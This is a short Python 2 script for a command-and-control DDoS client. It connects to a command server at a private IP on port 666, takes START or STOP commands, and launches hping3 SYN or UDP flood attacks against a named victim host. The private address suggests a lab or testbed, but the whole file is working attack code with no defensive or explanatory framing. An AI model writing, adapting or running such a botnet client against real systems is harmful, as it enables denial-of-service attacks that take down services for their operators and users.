'''
This program will run on every host, acting as an attacker.
An attacker will remain inactive, until a command is received
from the Command Server. Based on this command, an attack will
be carried out. Attacks can be started or stopped, depending on
the command.
'''

import subprocess
import socket
import sys

# Attack object is instanciated as null
attack = None

# Connection details for the command server
CommandServer = ('192.168.2.2', 666)

# This function terminates a running subprocess
def endProc(proc):
	if proc != None:
		proc.terminate()
		print 'Attack stopped!'

if __name__=='__main__':
	# Attempt to connect to the Command Server
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.connect(CommandServer)

	# Listen for command(s)
	while True:
		data = server.recv(1024)
		if data == '':
			try:
				server.connect(CommandServer)	# Constantly attempt to reconnect - not beautiful, but functional 
			except Exception as e:
				print 'Could not reach Command server!'

		# Look at how many data fields have been recieved
		# to determine if its a start-attack- or stop-attack-command
		NumberOfStatements = data.count('/') + 1
		if NumberOfStatements == 3:
			command, atkType, victim = data.split('/')
			print command
			print atkType
			print victim
		elif NumberOfStatements == 2:
			command, victim = data.split('/')
			print command
			print victim

		# Carry out the given command, using hping3 in a subprocess
		if command == 'START':
			if atkType == 'syn':
				print 'Running a SYN attack...'
				endProc(attack) # Terminate any previous running attack
				attack = subprocess.Popen(["hping3","-S","--flood", victim], stdout=subprocess.PIPE)
			elif atkType == 'udp':
				print 'Running a UDP attack...'
				endProc(attack) # Terminate any previous running attack
				attack = subprocess.Popen(["hping3", "--udp", "--flood", "p", "53", victim], stdout=subprocess.PIPE)
		elif command == 'STOP':
			endProc(attack)
			print 'Attack stopped'